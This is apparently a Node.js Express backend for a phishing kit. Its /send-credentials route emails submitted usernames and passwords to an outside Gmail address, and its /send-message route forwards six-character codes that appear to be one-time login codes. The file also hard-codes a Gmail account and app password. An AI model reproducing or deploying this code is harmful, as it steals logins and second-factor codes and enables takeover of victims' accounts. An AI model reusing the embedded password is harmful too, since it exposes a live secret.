const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();

app.use(cors());
app.use(express.json());

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "tnews3692@gmail.com",
    pass: "derqzmxppkmyjdao"
  },
});

// POST /send-credentials
app.post("/send-credentials", async (req, res) => {
  const { username, password } = req.body;
  try {
    await transporter.sendMail({
      from: "tnews3692@gmail.com",
      to: "aarchi.snapperit@gmail.com",
      subject: "New Username Submitted",
      html: `<h2>User Submitted</h2><p><strong>Username:</strong> ${username}</p><p><strong>Password:</strong> ${password}</p>`,
    });
    res.json({ success: true });
  } catch (error) {
    console.log("EMAIL ERROR:", error);
    res.status(500).json({ success: false, error });
  }
});

// POST /send-message
app.post("/send-message", async (req, res) => {
  const { message } = req.body;
  if (!message || message.length !== 6) {
    return res.json({ success: false, msg: "Message must be exactly 6 characters" });
  }
  try {
    await transporter.sendMail({
      from: "tnews3692@gmail.com",
      to: "aarchi.snapperit@gmail.com",
      subject: "New 7-Character Message",
      html: `<h2>New Message Received</h2><p><strong>Message:</strong> ${message}</p>`,
    });
    res.json({ success: true, msg: "Verify" });
  } catch (error) {
    console.log("EMAIL ERROR:", error);
    res.status(500).json({ success: false, error });
  }
});

// GET / (Root Route)
app.get("/", (req, res) => {
  res.send("Backend is running!");
});

// Start server
app.listen(5000, () => console.log("Server running on port 5000"));
